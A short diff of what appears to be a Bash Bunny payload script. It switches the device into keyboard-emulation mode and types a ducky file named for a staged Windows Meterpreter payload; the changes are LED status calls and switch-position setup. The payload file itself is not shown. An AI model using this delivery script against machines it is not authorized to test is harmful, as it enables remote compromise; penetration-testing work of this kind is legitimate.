@@ -29,20 +29,19 @@
 #         Red: failure to load dependency ducky script
 #
 
+LED SETUP
+
+GET SWITCH_POSITION
 
 ATTACKMODE HID
 
-LED R G 200
-
-LANGUAGE='us'
-
-source bunny_helpers.sh
+LED ATTACK
 
 if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/ducky.txt" ]; then
         QUACK ${SWITCH_POSITION}/windows-staged-meterpreter.txt
-        LED G
+        LED FINISH
 else
-    LED R
+    LED FAIL
     echo "Unable to load dwindows-staged-meterpreter.txt" >> /root/debuglog.txt
         exit 1
 fi
